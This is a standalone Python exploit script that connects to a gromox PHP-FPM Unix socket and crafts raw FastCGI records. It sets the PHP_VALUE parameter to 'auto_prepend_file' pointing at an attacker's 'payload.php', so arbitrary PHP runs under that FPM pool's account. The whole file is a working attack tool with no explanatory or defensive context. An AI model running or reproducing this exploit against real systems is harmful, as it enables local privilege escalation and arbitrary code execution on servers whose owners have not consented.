#!/usr/bin/env python3
import socket, struct, sys

SOCK = "/run/php-fpm/php-gromox-fpm.sock"
SCRIPT_FILENAME = sys.argv[1]      # a real .php path on disk, e.g. an existing gromox script
PREPEND_FILE   = sys.argv[2]       # your payload.php path, readable by gromox

def build_record(type_, content, req_id=1):
    length = len(content)
    return struct.pack(">BBHHBx", 1, type_, req_id, length, 0) + content

def build_params(params):
    out = b""
    for k, v in params.items():
        k, v = k.encode(), v.encode()
        out += struct.pack("B", len(k)) + struct.pack("B", len(v)) + k + v
    return out

params = {
    "GATEWAY_INTERFACE": "FastCGI/1.0",
    "REQUEST_METHOD": "GET",
    "SCRIPT_FILENAME": SCRIPT_FILENAME,
    "SCRIPT_NAME": "/" + SCRIPT_FILENAME.split("/")[-1],
    "QUERY_STRING": "",
    "REQUEST_URI": "/",
    "DOCUMENT_URI": "/",
    "DOCUMENT_ROOT": "/".join(SCRIPT_FILENAME.split("/")[:-1]),
    "SERVER_PROTOCOL": "HTTP/1.1",
    "CONTENT_LENGTH": "0",
    "PHP_VALUE": f"auto_prepend_file={PREPEND_FILE}",
}

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(SOCK)

begin = struct.pack(">HB5x", 1, 0)
s.sendall(build_record(1, begin))
s.sendall(build_record(4, build_params(params)))
s.sendall(build_record(4, b""))
s.sendall(build_record(5, b""))

resp = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    resp += chunk
print(resp.decode(errors="replace"))
